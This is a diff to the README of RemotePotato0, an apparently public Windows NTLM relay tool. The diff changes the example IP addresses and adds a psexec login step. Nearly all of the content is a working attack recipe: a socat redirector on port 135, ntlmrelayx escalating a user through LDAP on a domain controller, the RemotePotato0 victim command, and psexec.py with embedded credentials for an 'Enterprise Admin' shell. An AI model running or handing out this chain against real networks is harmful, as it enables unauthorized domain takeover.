@@ -13,22 +13,26 @@ Full details at --> https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-
 
 ## Example
 
-Attacker machine (10.0.0.20):
+Attacker machine (192.168.83.130):
 
 ```
-sudo socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.11:1111 &
-sudo ntlmrelayx.py -t ldap://10.0.0.10 --escalate-user winrm_user --no-wcf-server
+sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 &
+sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
 ```
 
-Victim machine (10.0.0.11):
+Victim machine (192.168.83.131):
 
 ```
-.\RemotePotato0.exe -r 10.0.0.20 -p 1111
+.\RemotePotato0.exe -r 192.168.83.130 -p 9998
 ```
 
-Victim Domain Controller (10.0.0.10)
+Victim Domain Controller (192.168.83.135)
 
 Enjoy shell (eg. psexec) as Enterprise Admin to the domain controller ;)
+
+```
+psexec.py 'SPLINTER/winrm_user_1:Password111!@192.168.83.135'
+```
 
 ## Demo
 
